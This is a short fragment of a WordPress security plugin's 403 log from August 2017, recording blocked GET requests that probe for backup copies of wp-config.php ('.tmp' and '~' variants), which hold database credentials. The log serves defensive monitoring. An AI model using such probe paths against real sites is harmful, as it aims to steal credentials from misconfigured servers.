+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36
+
+[403 GET Request: August 1, 2017 - 8:15 am]
+BPS: 2.3
+WP: 4.8
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 2001:ee0:4041:70cd:2eab:ff:feaf:b982
+Host Name: 2001:ee0:4041:70cd:2eab:ff:feaf:b982
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-config.php.tmp
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36
+
+[403 GET Request: August 3, 2017 - 3:27 pm]
+BPS: 2.3
+WP: 4.8
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 37.1.204.92
+Host Name: 37.1.204.92
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://whatsmycut.com/wp-config.php~
+REQUEST_URI: /wp-config.php~
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)
